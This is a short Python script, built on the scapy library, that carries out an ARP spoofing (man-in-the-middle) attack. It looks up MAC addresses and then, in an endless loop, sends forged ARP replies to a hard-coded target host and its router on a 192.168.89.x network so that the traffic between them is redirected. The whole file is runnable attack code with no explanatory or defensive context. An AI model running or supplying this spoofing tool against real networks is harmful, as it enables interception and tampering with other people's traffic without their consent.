#!/bin/env python
import time

import scapy.all as scapy

def get_mac(ip):
    # Set the ip address to ask
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answerd_list = scapy.srp(arp_request_broadcast, verbose=False, timeout=1)[0]

    return answerd_list[0][1].hwsrc


def spoof(target_ip, router_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
    scapy.send(packet)

while True:
    spoof("192.168.89.133", "192.168.89.2")
    spoof("192.168.89.2", "192.168.89.133")
    time.sleep(2)